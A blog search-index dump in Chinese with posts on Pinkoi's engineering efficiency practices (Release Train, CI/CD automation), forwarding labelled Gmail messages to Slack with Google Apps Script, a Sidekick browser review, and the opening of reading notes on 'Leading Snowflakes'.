freshOS / Localize 整理 (當然，如果你已經是用前文提到的統一由第三方工具管理，就可以不用這個)。第二個是 App 架構，不管是 MVC/MVVM/VIPER/Clean Architecture 都可以，核心重點是乾淨、統一；不用追求一定要潮，統一就好。 Pinkoi App Team 使用的 Clean Architecture 。 之前在 StreetVoice 只是純 MVC 但是是乾淨統一的，協作起來也很順暢。還有 UnitTest，人多很難避免你現在做的邏輯哪一天不小心被改壞；有多寫測試能多一份保障。最後就是文件的部分，關於團隊做事的流程、規格或操作手冊，方便隊友忘記的時候快速翻閱、新人快速上手。除了 Code Level 的介面之外，協作上還有其他介面協助我們提高效率。第一是在需求實作前有一個 Request for comments 的階段，負責開發的人大概說明一下這個需求會怎麼做，然後其他人可以留意見想法。除了可以防止重造輪子之外，還可以集思廣益，例如之後其他人要擴充別人要怎麼用、或日後可能有什麼需求可以列入考量…等等，當局者迷旁觀者清啊。第二是做好 Code Review，把關我們的介面共識有沒有落實，例如：Naming 方式、UI Layout 方法、Delegate 用法、Protocol/Class 宣告…等等還有架構有沒有亂用或趕時間亂寫、發展方向假設要朝全面 Swift 發展，有沒有還在送 OC 的 Code…等等主要是 Review 這些，其次才是功能正不正常…之類的協助。p.s. RFC 的目的是提升工作效率，所以不應該太冗長，甚至嚴重拖累工作進度；可以想成單純的開工前討論環節。統整一下團隊內介面共識的功能，最後提到一個 墜機理論 的 Mindset 我覺得是個不錯的行為基準點。摘錄自 MBA 智庫運用在團隊上就是假設今天所有人都突然消失了，現存的 Code、流程、制度能不能讓新的人快速上手？Recap 介面意義，團隊內的介面是用來增加彼此的共識，團隊外的協作是降低彼此的無效溝通，用介面作為溝通沒截，專注於需求討論。再次重申「介面溝通」不是什麼特別的專有名詞或是工具、工程的東西，他只是個概念，適用於任何職務場景的協作，可以單純只是份文件或流程，順序上要先有這個東西然後才來溝通。這邊假設每次多花的溝通時間是 10 分，團隊 60 人，每個月發生 10 次，一年就浪費了 1,200 小時在無謂的溝通上。提升效率 — 自動化重複性工作第二章節想要跟大家分享一下關於自動化重複工作對於提升工作效率的效果，一樣會以 iOS 為例，但 Android 也是相同的方式。不會提到技術實作細節，單講原理上的可行性。整理一下我們有用到的服務，包括但不限於： Slack：溝通軟體 Fastlane：iOS 自動化腳本工具 Github：Git Provider Github Action：Github 的 CI/CD 服務，後面會介紹 Firebase：Crashlytics、Event、App Distribution (後面會介紹)、Remote Config… Google Apps Script：Google Apps 的外掛腳本程式，後面會介紹 Bitrise：CI/CD Server Onesky：前面有說到，Localization 的第三方工具 Testflight：iOS App 內測平台 Google Calendar：Google 行事曆，後面會介紹用在哪 Asana：專案管理工具釋出測試版的問題第一個要說的重複性問題，是當我們 App 在開發階段想要給其他隊友搶先測試的時候，傳統就是直接借手機來 Build；如果只有 1~2 人問題不大，但是團隊有 20~30 人要測，光幫忙安裝測試版那天就不用工作了，而且若有更新，整個就都要重新來過。另一個方法是使用 TestFlight 作為測試版發布媒介，我覺得也不錯；但有兩個問題，第一個是 Testflight 等同 Production 環境，不是 Debug；第二是當同時開發的需求、同事要測不同需求的隊友很多，Testflight 就會大亂，包版的 Build 也會狂改，但也不是不行。在 Pinkoi 的解法是，首先將「由 App Team 來安裝測試版」這件事拆開，用 Slack WorkFlow 做為 Input UI 來達成，輸入完成後會觸發 Bitrise 跑 Fastlane 腳本去打包上傳測試版 ipa 到 Firebase App Distribution。 Slack Workflow 應用可參考此篇文章： Slack 打造全自動 WFH 員工健康狀況回報系統Firebase App Distribution要測試的隊友，只要照著 Firebase App Distribution 的步驟安裝完憑證、註冊完裝置，就能在上面選擇安裝想要的測試版，或直接回去點信的連結安裝。 但這邊要注意，iOS Firebase App Distribution 佔用的是 Development Device，上限只能只能註冊 100 個裝置，看裝置不看人。 所以可能要跟 TestFlight (by 人，外部測試 1,000 人) 的解法做個權衡。但至少前面的 Slack WorkFlow UI Input 是可以考慮採用的。 如果要做的進階可以開發 Slack Bot，能有更完整更客製化的流程、表單可用。Recap 釋出測試版自動化的成效，最有感的是把整個步驟都搬到雲端上執行，App Team 不需要插手，完全自助式。打包正式版的問題第二個也是 App Team 很常要做的事，打包、送審正式版 App。團隊小的時候，只有單線開發，App 版本更新問題不大，可以很自由也可以很規律。但團隊大，同時有多線的需求在開發跟迭代，就會遇到如上圖的狀況，沒有做好前文說的「介面溝通」就會大家各自上各自的，這會導致 App Team 疲於奔命，因 App 更新的成本比網頁高、過程繁瑣，另一方面頻繁零亂的更新也很干擾使用者。最後是管理問題，如果沒有固定的流程、日期，很難去對每個步驟該做什麼事進行優化。問題如上。解決辦法是導入 Release Train 到開發流程中，核心概念是把版本更新跟專案開發這兩件事分開。我們將日程固定下來，每個階段會做什麼事也定下來： 固定週一早上更新新版 固定週三 Code Freeze (不再 Merge Feature PR) 固定週四開始 QA 固定週五打包正式實際時程(QA 多久)、發版週期(每週、每兩週、每個月)依照各公司狀況可自行調整， 核心就是確定什麼固定什麼時間點做什麼事 。這是國外推友發的版更週期調查，大多是 2 週一次。以每週更新 &amp; 我們多團隊為例，就會如上圖。Release Train 顧名思義就像火車站一樣，每個版本都是一班列車如果錯過就要等下一班， 各個 Squad 團隊跟專案自己選擇要上車的時間這是一個很好的溝通介面，大家只要有共識並遵守規定就能有條不紊的更新版本。更多 Release Train 的技術細節可參考： Mobile release trains — Travelperk Agile Release Train Release Quality and Mobile Trains流程、日程確定後，我們就可以對每個階段做的事進行優化。像是打包正式版，傳統手動方式費時費力，從打包、上傳、送審整個流程大概要花 1 個小時，這時間內工作狀態要一直切換，很難做其他事；每次的打包都會重複這個過程，很浪費工作效率。既然我們已經固定日程了，這邊直接引入 Google Calendar，將預計日程要做的事加到行事曆上，時間到的時候會透過 Google Apps Script 去呼叫 Bitrise 執行 Fastlane 打包正式版和送審的腳本完成全部工作。使用 Google Calendar 串接還有個好處，如果遇到突發狀況需要延後、提早，直接上去更改日期即可。 Google Apps Script 若要直接在 Google Calendar 事件時間到時自動執行，目前只能自己 on 服務來做，如果要快速解決可以使用 IFTTT 做為 Google Calendar &lt;-&gt; Bitrise/Google Apps Script 的橋樑，做法可 參考此篇文章 。p.s. 1. 目前 Pinkoi iOS Team 是採用 Gitflow 工作流程。2. 原則上這個共識是所有團隊都要遵守，所以不希望有需求是打破這個規則的 (EX: 特別週三要上)，但如果是與外部合作的項目，如果真的沒辦法還是要保持彈性，畢竟這個共識是團隊內的。3. HotFix 嚴重問題，是隨時可更新的，不受 Release Train 規範。這邊多提了 Google App Scripts 的應用，詳情可參考： 運用 Google Apps Script 轉發 Gmail 信件到 Slack 。最後一個是使用 Github Action 提升協作效率 (PR Review)。Github Action 是 Github 的 CI/CD 服務，可以直接與 Github 事件作綁定，觸發時機從 open issue、open pr 到 merge pr…等等都有。Github Action 只要是 Github 託管的 Git 專案都能使用，Public Repo 沒有限制，Private 每個月有 2,000 分鐘的免費額度可以用。這邊舉兩個功能： (左)是 PR Review 完之後會自動打上 reviewer name Label，讓我們能快速 summary pr review 的狀況。 (右)是每天會在固定時間整理＆發送訊息到 Slack Channel，提醒隊友有哪些 PR 正在等待 Review（ 仿造 Pull Reminders 的功能 ）。Github Action 還有很多可以做的自動化項目，大家可以發揮想像。像是在開源專案常看到的 issue bot：fastlane / fastlane或自動關閉太久沒 Merge 的 pr 都能用 Github Action 來自動完成。Recap 自動化打包正式版的成效，一樣直接使用現有工具串接；除了 自動化之外還加入固定流程達到加倍提升工作效率原本除了手動打包時間，其實還有額外溝通上版時間的成本，現在直接歸 0；只要確保在時程內 上車 就可以把時間都專注在「討論」跟「開發」上。總計算一下這兩個自動化帶來的成效，一年可節省 216 工作時數。自動化加上前面提到的溝通介面，我們來看一下做這些事總共能提升多少效率。除了剛做的項目，我們還需要多評估 心流切換成本 ，當我們持續投入工作一段時間後就會進入「心流」狀態，此時的思緒、生產力都達到巔峰，能提供做好最有效的產出；但如果被無謂的事(EX: 多餘的溝通、重複性工作)打斷，要重新回到心流，又會再需要一段時間，這邊以 30 分鐘為例。被無謂的事打斷的心流切換成本也應該列入計算，這邊抓 30 分鐘每次，一個月發生 10 次，60 人一年就多浪費 3,600 小時。心流切換成本 (3,600) + 溝通介面不好的情況下多餘的溝通 (1,200) + 自動化解決的重複性工作 (216) = 一年多損失了 5,016 小時。原本浪費的工作時間，節省起來後可以投入其他更有價值的事，所以實際換成產能應該還要再 X 200%。 尤其隨著團隊規模不斷成長，對工作效率的影響也隨之放大。 早優化早享受，晚優化沒折扣！！Recap 高效率工作團隊的內幕，我們主要做了什麼事。 No Code/Low Code First 優先選擇現有工具串接（如本篇範例）如果沒有現有工具可用再來評估投入自動化的成本，跟實際節省的收入。關於文化的支持在 Pinkoi 人人都可以是解決問題的領導者對於問題的解決，事情的改變；絕大多數都需要很多很多團隊一起努力才有可能更好，這部分就很需要公司文化的支持鼓勵，不然只有自已在推動會非常辛苦。 在 Pinkoi 人人都可以是解決問題的領導者，不一定要是 Lead or PM 才能解決問題，前面介紹的溝通介面、工具或自動化項目很多都是隊友發現問題，提出解法，大家一起努力完成的。關於團隊文化是如何支持推動改變的，解決問題的四個階段都可以連結到 Pinkoi 的 Core Values。第一步 Grow Beyond Yesterday 好還要更好，如果有發現問題，不管是大小，前面有說到隨團隊規模成長，小問題也會有放大效果 調查、歸納問題，避免過早優化(有的問題可能只是暫時過渡而已)再來是 Build Partnerships 積極的溝通各面向蒐集建議 保持換位思考(因為有的問題可能是對方的最佳解，要做好權衡)第三步 Impact Beyond Your Role 發揮自身影響力 提出問題解決計畫 如果跟重複工作有關則優先使用自動化方案 記得保持彈性跟可擴充性，避免 Over Engineering最後 Dare to Fail！ 勇敢實踐 持續追蹤、動態調整解決方案 取得成功後，記得與團隊分享成果，以促成跨部門資源整合 (因為同個問題可能同時存在在多個部門)以上是 Pinkoi 高效率工程團隊大解密的分享，謝謝大家。立即加入 Pinkoi &gt;&gt;&gt; https://www.pinkoi.com/about/careers有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 2,733 Total Views Last Statistics Date: 2025-01-19 | 2,613 Views on Medium. " }, { "title": "運用 Google Apps Script 轉發 Gmail 信件到 Slack", "url": "/posts/d414bdbdb8c9/", "categories": "ZRealm Dev.", "tags": "ios-app-development, google-apps-script, cicd, slack, workflow-automation", "date": "2021-08-07 20:19:49 +0800", "snippet": "運用 Google Apps Script 轉發 Gmail 信件到 Slack使用 Gmail Filter + Google Apps Script 在收到信件時自動將客製化內容轉寄至 Slack ChannelPhoto by Lukas Blazek起源最近在優化 iOS App CI/CD 的流程，使用 Fastlane 作為自動化工具；打包上傳後如果要繼續完成自動送審步驟 ( s...", "content": "運用 Google Apps Script 轉發 Gmail 信件到 Slack使用 Gmail Filter + Google Apps Script 在收到信件時自動將客製化內容轉寄至 Slack ChannelPhoto by Lukas Blazek起源最近在優化 iOS App CI/CD 的流程，使用 Fastlane 作為自動化工具；打包上傳後如果要繼續完成自動送審步驟 ( skip_submission=false )，就需要等蘋果完成 Process 大概需要浪費 30~40 mins 的 CI Server 時間，因為蘋果 App Store Connect API 並不完善，Fastlane 也只能每分鐘去檢查一次上傳的 Build 是否處理完成，非常浪費資源。 Bitrise CI Server： 限制同時 Builds 數量及最大執行時間 90 mins，90 mins 是夠，但會卡著一條 Build 阻礙其他人執行。 Travis CI Server： 依照 Build Time 收費，這樣更不能等了，錢直接打水漂。換個思路不等了，上傳完直接結束！靠處理完成的信件通知觸發後續動作。 不過最近我都沒收到這封信了，不知道是設定問題還是蘋果不再發此類通知。本文將以 Testflight 已經可以開始測試的信件通知為例。 完整流程如上圖所示，原理上可行；但不是本文要討論的重點，本文將著重在收到信件、使用 Apps Script 轉發至 Slack Channel 部分。如何轉發收到的 Email 到 Slack Channel不管是付費或是免費的 Slack 專案都能使用不同方法達成 Email 轉發到 Slack Channel or DM 功能。可參考官方文件進行設置： 傳送電子郵件至 Slack不管哪種方法效果都如下： 預設摺疊信件內容，點擊後可以展開查看全部內容。優點： 簡單快速 零技術門檻 即時轉送缺點： 無法對內容進行客製 顯示樣式無法更改客製轉發內容就是本篇要介紹的重點。將信件內容資料轉譯成自己想呈現的樣式，如上圖範例。先上一張完整運作流程圖： 使用 Gmail Filter 對要轉發信件加上辨識 Label Apps Script 定時獲取被標記成該 Label 的信件 讀取信件內容 渲然成想要的顯示樣式 透過 Slack Bot API 或直接用 Incoming Message 發送訊息到 Slack 移除信件 Label (代表已轉發) 完成首先，要在 Gmail 中建立篩選器篩選器可以在收到符合條件信件時自動化做一些事，例如：自動標記已讀、自動標記 Tag、自動移入垃圾郵件、自動歸入分類…等等操作在 Gmail 點擊右上進階搜尋圖標按鈕，輸入要轉發的信件規則條件，例如來自： no_reply@email.apple.com + 主題是 is now available to test. ，點擊「Search」查看篩選結果是否如預期；如果正確可以點擊 Search 旁的「Create filter」按鈕。或直接在信件裡上方點 Filter message like these 就能快速建立篩選條件 這按鈕設計很反人類，第一次找一直沒看到。下一步設定符合此篩選條件是的動作，這邊我們選「Apply the label」建立一個獨立新辨識用 Label 「forward-to-slack」，點擊「Create filter」完成。爾後被標上這個 Label 的信都會被轉發到 Slack。取得 Incoming WebHooks App URL首先我們要加入 Incoming WebHooks App 到 Slack Channel，我們會透過此媒介來傳送訊息。 Slack 左下角「Apps」-&gt;「Add apps」 右邊搜尋匡搜尋「incoming」 點擊「Incoming WebHooks」-&gt;「Add」選擇訊息想要傳到的 Channel。記下最上方的「Webhook URL」往下滑可設定傳送訊息時，傳送 Bot 顯示的名稱及大頭貼；改完記得按「Save Settings」。 備註 請注意官方建議使用新的 Slack APP Bot API 的 chat.postMessage 來傳送訊息，Incoming Webhook 簡便的這個方式之後會棄用，這邊偷懶沒有使用，可搭配下一章「匯入員工名單」會需要 Slack App API 一起調整成新方法。撰寫 Apps Script 程式 點此前往我的 Apps Script 專案 點選左上「新專案」 建立後，可點擊專案名稱重新命名 EX: ForwardEmailsToSlack貼上以下基本程式並修改成你想要的版本：function sendMessageToSlack(content) { var payload = { \"text\": \"*您收到一封信件*\", \"attachments\": [{ \"pretext\": \"信件內容如下:\", \"text\": content, } ] }; var res = UrlFetchApp.fetch('貼上你的Slack incoming Webhook URL',{ method : 'post', contentType : 'application/json', payload : JSON.stringify(payload) })}function forwardEmailsToSlack() { // 參考自：https://gist.github.com/andrewmwilson/5cab8367dc63d87d9aa5 var label = GmailApp.getUserLabelByName('forward-to-slack'); var messages = []; var threads = label.getThreads(); if (threads == null) { return; } for (var i = 0; i &lt; threads.length; i++) { messages = messages.concat(threads[i].getMessages()) } for (var i = 0; i &lt; messages.length; i++) { var message = messages[i]; Logger.log(message); var output = '*New Email*'; output += '\\n*from:* ' + message.getFrom(); output += '\\n*to:* ' + message.getTo(); output += '\\n*cc:* ' + message.getCc(); output += '\\n*date:* ' + message.getDate(); output += '\\n*subject:* ' + message.getSubject(); output += '\\n*body:* ' + message.getPlainBody(); sendMessageToSlack(output); } label.removeFromThreads(threads);}進階： Slack 訊息樣式可參考這份官方結構文件 。 你可以使用 Javascript 的 Regex Match Function，對信件內容進行匹配爬取。EX：爬取 Testflight 審核成功信件內的版本號資訊：信件標題：Your app XXX has been approved for beta testing.信件內容：我們想得到 Bundle Version Short String 還有 Build Number 後面的值 。var results = subject.match(/(Bundle Version Short String: ){1}(\\S+){1}[\\S\\s]*(Build Number: ){1}(\\S+){1}/);if (results == null || results.length != 5) { // not vaild} else { var version = results[2]; var build = results[4];} Regex 使用方法可參考這裡 線上測試 Regex 是否正確可使用 此網站執行看看 回到 Gmail 隨便找一封信，手動幫他加上 Label — 「forward-to-slack」 在 Apps Script 程式碼編輯器上選擇「forwardEmailsToSlack」然後點擊「執行」按鈕若出現 「Authorization Required」則點選「Continue」完成驗證在身份驗證的過程中會出現「Google hasn’t verified this app」這是正常的，因為我們寫的 App Script 沒有經過 Google 驗證，不過沒關係這是寫給自己用的。可點選左下角「Advanced」-&gt;「Go to ForwardEmailsToSlack (unsafe)」點擊「Allow」轉發成功！！！設置觸發器(排程)自動檢查＆轉發在 Apps Script 左方選單列，選擇「觸發條件」。左下角「+ 新增觸發條件」。 錯誤通知設定：可設定當腳本執行遇到錯誤時，該如何通知你 選擇您要執行的功能：選擇 Main Function sendMessageToSlack 選取活動來源：可選擇來自日曆或是時間驅動(定時或指定) 選取時間型觸發條件類型：可選特定日期執行或每分/時/日/週/月執行一次 選取分/時/日/週/月間隔：EX: 每分鐘、每 15 分鐘… 這邊為了示範設定成每分鐘執行一次，我覺得信件的即時程度可以設每小時檢查一次就好。 再次回到 Gmail 隨便找一封信，手動幫他加上 Label — 「forward-to-slack」 等待排程觸發自動檢查＆轉發成功！完工藉由此功能便能達成客製化信件轉發處理，甚至是再當成觸發器使用，例如：收到 XXX 信時自動執行某腳本。回到第一章起源，我們便可以使用此機制，完善 CI/CD 流程；不需要呆呆等待蘋果完成處理，又能串上自動化流程！延伸閱讀 Crashlytics + Big Query 打造更即時便利的 Crash 追蹤工具 Crashlytics + Google Analytics 自動查詢 App Crash-Free Users Rate 使用 Python+Google Cloud Platform+Line Bot 自動執行例行瑣事 Slack 打造全自動 WFH 員工健康狀況回報系統 APP有用HTTPS傳輸，但資料還是被偷了。有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 1,768 Total Views Last Statistics Date: 2025-01-19 | 1,722 Views on Medium. " }, { "title": "生產力工具 拋棄 Chrome 投入 Sidekick 瀏覽器的懷抱", "url": "/posts/118e924a1477/", "categories": "ZRealm Life.", "tags": "sidekick, chrome, chromium, browsers, 生活", "date": "2021-08-07 13:06:43 +0800", "snippet": "[生產力工具] 拋棄 Chrome 投入 Sidekick 瀏覽器的懷抱Sidekick 瀏覽器功能介紹＆使用心得2024 Update大約 2023 年初我就跳槽去用 Arc 瀏覽器啦！ 使用體驗跟功能更好、Bug 更少、也支援跨電腦同步功能。Here’s a link to download Arc, the browser I was telling you about!https:/...", "content": "[生產力工具] 拋棄 Chrome 投入 Sidekick 瀏覽器的懷抱Sidekick 瀏覽器功能介紹＆使用心得2024 Update大約 2023 年初我就跳槽去用 Arc 瀏覽器啦！ 使用體驗跟功能更好、Bug 更少、也支援跨電腦同步功能。Here’s a link to download Arc, the browser I was telling you about!https://arc.net/gift/f86ef8b3前言知道 Sidekick 瀏覽器是來自同事的分享；老實說一開始並沒有抱太大期待，其實這幾年一直都有拋棄 Chrome 的念頭，改用過 Safari、搶先體驗版的 Safari、Firefox、Opera、基於開源核心開發的第三方瀏覽器，但屢屢失敗，幾乎用不了幾天就又認錯裝回 Chrome，另外一個原因是自己並沒有很積極的 Follow 瀏覽器市場，也許早就有符合我需求的瀏覽器，只是我不知道罷了。失敗原因主要原因是我常用的擴充功能不能完全支援，太依賴也太習慣 Chrome 的擴充功能了，其次就算是 Chromium 核心能無痛支援但功能方面並沒有特別亮點，跟用 Google Chrome 體驗差不多。我的需求 Chromium 核心，因為要支援我常用的擴充功能 有更多特色功能，幫助提升生產力 支援 MacOS，iOS 我習慣用 Safari 所以不要求支援跨裝置 優秀的記憶體管理 加強隱私反追蹤 無痛轉移功能關於生產力功能，其實 Chrome 擴充功能有上千萬的工具可以用，自己搜尋、組合起來也能達到效果；但是我們沒做過研究調查，老實說不太清楚什麼流程跟功能是對生產力有幫助的。關於 Sidekick 開發團隊：Sidekick 新創團隊創立於 2020/11 @ San-Francisco / 募資中 瀏覽器核心：Chromium 當前階段：early access 核心價值： 專為工作流程優化，提升生產力的瀏覽器 支援平台：Windows、Mac OS、Mac OS (M1)、Linux (deb)、Linux (rpm) 擴充功能：支援所有 Chrome Store 擴充功能 (bitwarden、lastpass 、1password、grammarly、google translate…) 官方網站： www.meetsidekick.com馬上下載使用 點此進入官方網站 點擊「Download Now」 選擇符合自己作業系統的版本 下載＆完成安裝 開啟 Sidekick映入眼簾的是 Sidekick 介紹頁，點擊上方「Continue」繼續。使用 Google、Microsoft 或直接建立 Sidekick 帳號；這個帳號是 for Sidekick 服務的帳號，與 Google、Microsoft 無關。⬇️⬇️⬇️ 如果你是從 Chrome 要轉換到 Sidekick， 請先閱讀完本章節再繼續建立帳號 ⬇️⬇️⬇️ 跟 Chrome 不同 Chrome 安裝完的登入帳號就是直接綁定、同步 Google 帳號上的瀏覽器資料； 你會發現 Sidekick 這步登入完帳號什麼資料也沒進來，原因是 Google 目前封鎖所有第三方服務存取同步功能 ，所以 Sidekick 無法直接透過帳號做同步、匯入資料。人員資料部分也不能同步 Google 的帳號資訊Sidekick 同步設定，只有可憐的搜尋字詞同步那要如何匯入 Chrome 資料呢？官方給的方法非常繞路，但目前也只能這樣。如果你本來就是 Chrome 的使用者可以跳過 1~3 步驟。 下載＆安裝 Chrome 登入 Chrome 完成同步 Google 帳號上的瀏覽器資料到 Chrome 完全關閉 Chrome ( ! 重要 !，MacOS 用戶請確認 Dock 上 Chrome Icon 下面沒有小點點) 繼續前一步的建立帳號 第一次建立完帳號，會問你要從哪個瀏覽器匯入資料 選擇 Chrome 等待匯入完成匯入完成後，所有書籤、瀏覽紀錄、已存密碼、已登入的網站 Session、擴充功能，都會無痛搬移到 Sidekick 上；只有少部分服務需要重新登入，其他都不用，等於無痛轉移！ 這邊有個小問題，就是如果非建立新帳號（EX: 重裝）就只能書籤、瀏覽紀錄、已存密碼；擴充功能無法自動匯入， 查官方 Q&amp;A 只得到自己從 Chrome extension / app store 重裝 。同步問題？既然 Google 封鎖第三方存取雲端資料，那如何解決書籤跨裝置同步問題呢？Sidekick 近期將會釋出 Sidekick Sync 解決這個問題 。 本文使用的是我個人電腦，非辦公用；所以會夾雜社群娛樂網站，敬請見諒。特色功能無痛轉移如同前文安裝步驟，第一次安裝打開、建立帳號登入後；可以無痛從現有的 Safari、Chrome、Edge 無痛轉移所有書籤、瀏覽紀錄、已存密碼、已登入的網站 Session、擴充功能。已登入的網站 Session、擴充功能我覺得是體驗最好的，以往的瀏覽器都只做書籤的轉移，但所有網站都要重新登入、所有擴充功能都要重新安裝，非常的消耗耐心。強大的首頁功能與 Chrome 單調的首頁不同也不需要花心力去找首頁解決方案，Sidekick 自帶精美又方便的首頁功能。 搜尋匡可搜尋 瀏覽紀錄、書籤，若無搜尋結果則自動變 Google 搜尋 左上方數據化顯示反追蹤、記憶體管理、反廣告狀況 顯示今日日期、現在時間 上方我們稱為 Tab，左側工具列上方稱為 Application 首頁背景圖可客製化，或自動展示風景圖Application 功能不只是網站的快速入口， 使用起來類似 MacOS 的 Dock，Application 網站啟用時會常駐在瀏覽器上（左方有小點點）但同時又會做好記憶體管理；啟用狀態下如果網站有通知會標記數字提醒。Application 可以快速從首頁加入，也可以從 Tab 建立或手動輸入網址、ICON 圖片加入。Sidekick 已內建了上百個生產力工具網站，可快速加入 Application。 如果從首頁加入 Application 後沒出現在左方 Sidebar 可以自行拖曳過去。在 Application 按右鍵可快速查看最近瀏覽、另外也支援多帳號切換。 多帳號切換支援的網站不太多，不支援只能先用 Private Mode (無痕模式)；目前測試 Slack、Notion 都支援。 左方 Application 與上方 Tab 互不影響，Application 區塊是獨立的不會出現在上方 Tab。每個 App 都可個別進行設定，例如關閉通知、關閉 Badge 等等。視窗分割功能雖然 MacOS 自帶視窗分割功能，但我其實很少使用；除非是想要完全進入專注狀態，更多時候的需求是要同步對照網頁內容+使用其他 MacOS App 做事，這時候純瀏覽器的分割視窗功能就很實用！例如，這樣就可以邊上線上課＆做筆記。中間分隔大小可以自由拖曳調整。使用方法，只要點擊瀏覽器右上角的分割視窗按鈕，選擇要加入左方的視窗即可，再點一次就會關閉分割。Spotlight 功能類似 MacOS 的 Spotlight，在任何視窗都能按下「Option」+「f」做全瀏覽器搜尋。 可以使用「Option」＋「z」或「Control」+「tab」進行 Tab 的快速切換 「Option」＋「1–9」快速切換位置 1~9 的TabTab Saver (Save Sessions) 功能同 Chrome 上很流行的 Tab Saver 擴充功能，能快速儲存目前已打開的 Tab 網頁，並且能在其中做切換，方便我們管理工作的不同狀態。點擊左下角的「F」(First Session) 即可進入 Session 管理頁面。點擊上方「Add new session」可以將目前 Tab 狀態儲存下來，開啟全新乾淨的瀏覽環境。可以在 Session 之間切換，點擊「Activate」即可恢復 Tab。 Session 不會影響到左邊啟用中的 Application。 可以使用快捷鍵「Option」+「W」快速進行 Session 切換 「Option」+「⬆️」+「W」進行 Session 管理優秀的 Application 通知功能實際上現在開始，只要有提供 Web 版的通訊服務，都可以直接使用 Sidekick Application 不需特別安裝電腦應用程式；前文有提到 Application 的通知功能就如同電腦應用程式，一樣即時完整。 記得授權 Sidekick 發送電腦端通知；這樣網頁的通知才會在電腦端跳出來提示。筆記功能內建整合 Google Keep 雲端筆記功能，點擊左下方文件 Icon 可快速開啟 Google Keep 做筆記。Google Keep 儲存於雲端 Google 帳號，支援跨平台跨裝置的筆記同步存取。可以使用這個功能快速紀錄事項。 不太確定日後會不會改成自家的 Sidekick Sync，畢竟這樣才有優化整合的空間。 可以使用快捷鍵「Option」+「N」快速進行 Session 切換內建反追蹤反廣告、記憶體管理功能隱私浪潮的來襲，各大企業漸漸開始注重用戶隱私，以 Apple 為最主要領導者，在新版 Safari 中也開始內建隱私保護功能；但作為隱私資訊的最大獲利者 Google 廣告，我想應該很難在 Google Chrome 上看到改變。 Chromium != Chrome，Chromium 是瀏覽器技術核心的開源專案。雖然 Chromium 也是由 Google 主導，但他開源自由原始碼的特性；讓任何開發者都能基於此核心進行優化；Sidekick 也是運用此方法在 Chromium 基礎上進行優化，能同時保留 Chrome 的特點但又能加強 Chrome 缺少的功能。細節 如果是雙螢幕使用者，同樣可以把 Tab 拉成獨立視窗；獨立視窗就不會有左方的工具列。 支援所有 Chrome 擴充功能，可直接到商城下載安裝 更多功能等你來探索體驗！費用 「企業不賺錢是種罪惡 (你不賺錢，是對社會的罪惡，因為我們拿社會的資金，取社會的人才，沒有充足的盈餘，我們在浪費社會可貴資源，這些資源可以在別處更有效地運用。)」- Panasonic 創辦人 — 松下幸之助 (文字參考自商業思維學院)一個好的產品要能有好的現金流，才能提供更好的服務也才能走得更久；以下是 Sidekick 的收費內容：以個人使用來說免費方案啜啜有餘，但如果有能力就不妨贊助一下開發團隊吧！ 目前加入的使用者都是屬於 Early access 方案，貌似不受 Free 方案影響（我 Sidebar apps 超過 5 個也沒事）。 現在邀請 10 位使用者 6 個月 Pro / 邀請 20 位使用者終身 Pro 的方案；所以喜歡本文的朋友可以透過 文內連結進行下載安裝，支持我也支持 Sidekick！使用心得總結這陣子使用下來，因為無痛轉移的緣故；已經完全捨棄 Chrome，也沒有什麼東西是一定要回去用 Chrome 開的，最好用的還是左方的 Applications，可以將工作上常用的網站加入在左方，快速切換處理＆取得最新通知。以往都會迷失在混亂的 Tab 中，或只能使用 Pin Tab 方式把固定重要的工作服務 Pin 在前面；但在切換的時候還是很痛苦，要去尋找。現在我要做 Code Review 時就點 Github、要送審 App 時就點 App Store Connect、要看專案時就點 Asana，工作起來很有效率。記憶體管理的部分，沒有特別做研究測試；不太確定優化效果，但有總比沒有好。 唯一隱憂是這個產品還太新，不太確定能走多遠；如果因為經營不善可能就會停止開發維護了；那會非常可惜！所以請大家大力推廣支持！延伸閱讀 使用 Google Site 建立個人網站還跟得上時代嗎 ？ 使用 iPhone 簡單製作「偽」透視透明手機桌布 Medium 自訂網域功能回歸 ZReviewsBot — Slack App Review 通知機器人有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 7,497 Total Views Last Statistics Date: 2025-01-19 | 7,461 Views on Medium. " }, { "title": "Leading Snowflakes 閱讀筆記", "url": "/posts/1c9eafd4a190/", "categories": "", "tags": "management, leadership, engineering, 管理學, 工程師", "date": "2021-07-25 15:44:20 +0800", "snippet": "Leading Snowflakes — 閱讀筆記“Leading Snowflakes The Engineering Manager Handbook” — Oren Ellenbogen管理職，初來乍到，一切都很迷茫；對於管理的知識只有彙整之前的工作經驗、觀察或與其他同事閒聊時獲得，知道主管做了什麼事底下的人是正面的、什麼事是負面的；也就大概只有這些經驗想法，知識是破碎的，沒有一個有系...", "content": "Leading Snowflakes — 閱讀筆記“Leading Snowflakes The Engineering Manager Handbook” — Oren Ellenbogen管理職，初來乍到，一切都很迷茫；對於管理的知識只有彙整之前的工作經驗、觀察或與其他同事閒聊時獲得，知道主管做了什麼事底下的人是正面的、什麼事是負面的；也就大概只有這些經驗想法，知識是破碎的，沒有一個有系統理念，於是我開始看書，開始記錄一下每個作者的經驗；如果遇到相同的事物，有了「知識底氣」之後就不會在手忙腳亂了。Leading Snowflakes 語言：英文 作者：Oren Ellenbogen 出版年份：2013 官方網站 感謝 海總理 推薦作者在過去近 20 年的工作經歷中，從原本的軟體工程師一步步踏入管理職；擔任過不管是大公司或新創公司之 Technical Lead、Engineering Manager；本書詳細點出從工程師踏入管理職時會遇到的瓶頸及該用什麼方法整理、解決。我覺得與我的背景非常相似，都是本來做軟體開發，初探管理職；藉由書中提到的重點讓我學到很多可以怎麼做的方法！ - 本文僅為個人筆記夾雜些許個人觀點，在這資訊碎片化的年代，強烈建議要自行閱讀過原文書，才能有系統的吸收精髓。 - 筆記的意義是之後回頭來看，比較容易快速定位到想複習的點。 - 部分內容直接摘錄原文。Lesson 1. — Switch between “Manager” and “Maker” 